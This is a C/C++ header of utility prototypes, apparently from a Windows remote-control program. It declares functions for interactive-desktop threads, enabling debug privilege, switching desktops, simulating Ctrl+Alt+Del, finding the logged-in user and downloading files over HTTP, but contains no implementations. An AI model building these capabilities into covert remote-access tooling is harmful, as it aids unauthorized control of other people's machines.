#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED
#include "RegEditEx.h"
#include <assert.h>
#include <stdio.h>
#include <tchar.h>
typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive = false);

DWORD GetProcessID(LPCTSTR lpProcessName);
TCHAR *GetLogUserXP();
TCHAR *GetLogUser2K();
TCHAR *GetCurrentLoginUser();

bool SwitchInputDesktop();
BOOL DebugPrivilege(const char *PName,BOOL bEnable);
BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(TCHAR *name);
BOOL SimulateCtrlAltDel();
BOOL http_get(TCHAR* szURL, TCHAR* szFileName);
#endif // !defined(AFX_UNTIL_H_INCLUDED)